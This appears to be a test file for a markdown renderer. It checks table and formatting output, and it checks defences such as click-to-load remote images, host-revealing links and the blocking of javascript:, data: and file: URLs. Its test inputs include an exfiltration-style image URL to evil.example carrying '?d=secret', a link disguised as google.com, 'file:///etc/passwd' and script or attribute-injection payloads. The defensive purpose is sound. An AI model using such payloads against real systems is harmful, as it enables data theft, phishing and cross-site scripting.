/**
 * Notes render the markdown a real agent writes, tables included
 * (2026-11-07: a real crew turn wrote one and it showed as raw pipes).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { renderMarkdown } from "../src/utils/markdown.ts";

test("a pipe table becomes a table, header and rows", () => {
  const html = renderMarkdown("For each part:\n| Part | Supplier | Phone |\n|---|:---:|---|\n| M3 bolt | **Acme** | 555 |\n| | | |\nAfter.");
  assert.match(html, /<p>For each part:<\/p>/);
  assert.match(html, /<thead><tr><th>Part<\/th><th>Supplier<\/th><th>Phone<\/th><\/tr><\/thead>/);
  assert.match(html, /<td>M3 bolt<\/td><td><strong>Acme<\/strong><\/td><td>555<\/td>/);
  assert.equal((html.match(/<tr>/g) ?? []).length, 3, "header, a filled row and an empty row");
  assert.match(html, /<\/table><\/div>\n<p>After.<\/p>/);
});

test("pipes without a rule line stay text, and a rule alone is still a rule", () => {
  assert.doesNotMatch(renderMarkdown("| just | pipes |\nnext"), /<table>/);
  assert.equal(renderMarkdown("---"), "<hr>");
});

test("what a text box writes: _italic_, ~~struck~~ and <u>underlined</u>, alone and together", () => {
  assert.equal(renderMarkdown("an _italic_ word"), "<p>an <em>italic</em> word</p>");
  assert.equal(renderMarkdown("~~gone~~"), "<p><s>gone</s></p>");
  assert.equal(renderMarkdown("<u>under</u>"), "<p><u>under</u></p>");
  assert.equal(renderMarkdown("- <u>_both_</u>"), "<ul>\n<li><u><em>both</em></u></li>\n</ul>");
  assert.equal(renderMarkdown("**_bold italic_**"), "<p><strong><em>bold italic</em></strong></p>");
});

test("an underscore inside a word is not italic, and <u> is the only tag let back in", () => {
  assert.equal(renderMarkdown("snake_case_name and file_name.ts"), "<p>snake_case_name and file_name.ts</p>");
  const html = renderMarkdown('<u onclick="x()">a</u> <b>b</b> <img src=x>');
  assert.doesNotMatch(html, /<u onclick|<b>|<img/);
});

test("cells are escaped like everything else", () => {
  const html = renderMarkdown("| a |\n|---|\n| <script>x</script> |");
  assert.match(html, /&lt;script&gt;/);
  assert.doesNotMatch(html, /<script>/);
});

// ---------- pictures and links from elsewhere (rendered agent, Slack, README and release text) ----------

test("a picture from elsewhere isn't loaded on sight: a placeholder with its host and a Load image press", () => {
  const html = renderMarkdown("![chart](https://evil.example/p.png?d=secret&a=1)");
  assert.doesNotMatch(html, /<img/, "no <img> until a person presses");
  assert.match(html, /class="md-img-remote"/);
  assert.match(html, /Image from <b>evil\.example<\/b>/);
  assert.match(html, /<button type="button" class="md-img-load" data-load-image>Load image<\/button>/);
  // the address waits in a data attribute, escaped, for the press
  assert.match(html, /data-src="https:\/\/evil\.example\/p\.png\?d=secret&amp;a=1"/);
  assert.match(html, /contenteditable="false"/, "a text box's editing can't type into it");
  // plain http too
  assert.doesNotMatch(renderMarkdown("![x](http://10.0.0.5/x.png)"), /<img/);
});

test("Foundation's own files and data: images load as pictures", () => {
  assert.equal(renderMarkdown("![f](/files/f_1)"), '<p><img class="md-img" src="/files/f_1" alt="f" loading="lazy"></p>');
  assert.match(renderMarkdown("![d](data:image/png;base64,iVBORw0KGgo=)"), /<img class="md-img" src="data:image\/png;base64,iVBORw0KGgo="/);
  // a data: address that isn't an image is neither a picture nor a link
  const page = renderMarkdown("![d](data:text/html;base64,PHNjcmlwdD4=)");
  assert.doesNotMatch(page, /<img|<a |data:text/);
});

test("a link shows its real host, opens in a new tab with no opener and no referrer", () => {
  const html = renderMarkdown("[google.com](https://evil.example/login)");
  assert.match(html, /<a href="https:\/\/evil\.example\/login" data-ext="1" target="_blank" rel="noopener noreferrer" title="https:\/\/evil\.example\/login">google\.com<\/a>/);
  assert.match(html, /<span class="md-link-host" data-md="host" contenteditable="false">evil\.example<\/span>/, "the host the words don't say");
  // words that already name the host don't repeat it
  assert.doesNotMatch(renderMarkdown("[see github.com/x](https://www.github.com/x)"), /md-link-host/);
});

test("no javascript:, data: or vbscript: link is ever made, and no picture from them", () => {
  for (const url of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "data:text/html,hi", "vbscript:msgbox(1)", "//evil.example/x", "file:///etc/passwd"]) {
    const html = renderMarkdown(`[x](${url}) ![y](${url})`);
    assert.doesNotMatch(html, /<a |<img|data-src/, url);
  }
});

test("marks can't reach into an address, and a picture inside a link stays a placeholder", () => {
  const html = renderMarkdown("[evil](https://evil.example/a*b*c_d_e)");
  assert.match(html, /href="https:\/\/evil\.example\/a\*b\*c_d_e"/);
  assert.doesNotMatch(html, /<em>/);
  const both = renderMarkdown("[![logo](https://img.example/a.png)](https://site.example)");
  assert.match(both, /<a href="https:\/\/site\.example"[^>]*><span class="md-img-remote"/);
  assert.doesNotMatch(both, /<img|\u0000/);
  // a quote can't close an attribute
  assert.doesNotMatch(renderMarkdown('[x](https://a.example/"onmouseover="x)'), /"onmouseover="/);
  // text can't forge the renderer's own tokens
  const forged = renderMarkdown("[a](https://a.example) \u00000\u0000");
  assert.doesNotMatch(forged, /\u0000/);
  assert.equal((forged.match(/<a /g) ?? []).length, 1);
});
